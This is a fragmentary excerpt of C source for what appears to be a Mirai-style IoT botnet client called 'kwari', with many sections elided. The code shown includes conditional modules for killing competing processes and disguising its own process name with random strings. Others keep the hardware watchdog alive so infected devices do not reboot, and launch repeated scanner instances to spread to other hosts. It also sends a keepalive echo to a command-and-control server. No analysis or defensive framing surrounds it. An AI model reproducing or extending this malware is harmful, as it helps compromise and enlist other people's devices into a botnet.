...
// Additional includes for conditional compilation features
...
// Conditional compilation function declarations
#ifdef kwari_KILLER
static void enhanced_process_hiding(void);
static void advanced_killer_init(void);
#endif

#ifdef kwari_IOCTL
static void enhanced_ioctl_keepalive(void);
static void system_stability_monitor(void);
#endif

#ifdef kwari_SCANNER
static void enhanced_scanner_init(void);
static void distributed_scanning(void);
#endif
...
int main(int argc, char **args)
{
...
#ifdef kwari_KILLER
    // Enhanced process hiding and killing capabilities
    ensure_single_instance();
#endif
...
#ifdef kwari_IOCTL
    // Enhanced IOCTL keepalive for system stability
    ioctl_keepalive();
#endif
...
#ifdef kwari_SCANNER
#ifdef kwari_SERVER
    // Enhanced server mode: Multiple scanner instances for better coverage
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    ...
    scanner_init();
#else
    // Standard mode: Basic scanner instances
    scanner_init();
    scanner_init();
    scanner_init();
#endif
        ...
        if(pending_connection)
        {
            ...
            else
            {
                ...
                else
                {
                    ...
                    // Send the 2-byte echo payload that the CNC expects
                    uint16_t echo_payload = 0;
                    send(fd_serv, &echo_payload, sizeof(echo_payload), MSG_NOSIGNAL);
...
// ============================================================================
// CONDITIONAL COMPILATION FUNCTIONS - Advanced Process Obfuscation
// ============================================================================
...
{
    #ifdef DEBUG
        printf("[kwari_KILLER] Enhanced process hiding activated\n");
        fflush(stdout);
    #endif
    
    // Advanced process name obfuscation
    char stealth_name[32];
    int name_len = (rand_next() % 15) + 5;
    rand_alpha_str(stealth_name, name_len);
    stealth_name[name_len] = 0;
    prctl(PR_SET_NAME, stealth_name);
    ...
    #ifdef DEBUG
        printf("[kwari_KILLER] Process name set to: %s\n", stealth_name);
        fflush(stdout);
    #endif
}
...
{
    #ifdef DEBUG
        printf("[kwari_KILLER] Advanced killer initialization\n");
        fflush(stdout);
    #endif
    
    // Enhanced process killing with stealth
    killer_init();
    
    // Additional stealth measures
    enhanced_process_hiding();
}
#endif
...
{
    #ifdef DEBUG
        printf("[kwari_IOCTL] Enhanced IOCTL keepalive activated\n");
        fflush(stdout);
    #endif
    
    // Multiple IOCTL device attempts for better compatibility
    char *devices[] = {
        "/dev/watchdog",
        "/dev/misc/watchdog", 
    ...
    for (int i = 0; i < 4; i++) {
        ...
        if (fd >= 0) {
            #ifdef DEBUG
                printf("[kwari_IOCTL] Successfully opened device: %s\n", devices[i]);
                fflush(stdout);
            #endif
#ifdef WDIOC_KEEPALIVE
            ioctl(fd, WDIOC_KEEPALIVE, 0);
#else
            // Fallback for systems without WDIOC_KEEPALIVE
            ioctl(fd, 0x80045705, 0); // WDIOC_KEEPALIVE value
#endif
            close(fd);
            break;
        }
...
{
    #ifdef DEBUG
        printf("[kwari_IOCTL] System stability monitoring activated\n");
        fflush(stdout);
    #endif
    
    // Enhanced system monitoring
    enhanced_ioctl_keepalive();
}
#endif
...
{
    #ifdef DEBUG
        printf("[kwari_SCANNER] Enhanced scanner initialization\n");
        fflush(stdout);
    #endif
...
{
    #ifdef DEBUG
        printf("[kwari_SCANNER] Distributed scanning activated\n");
        fflush(stdout);
    #endif
    
    // Multiple scanner instances for better coverage
    for (int i = 0; i < 3; i++) {
        scanner_init();
    }
}
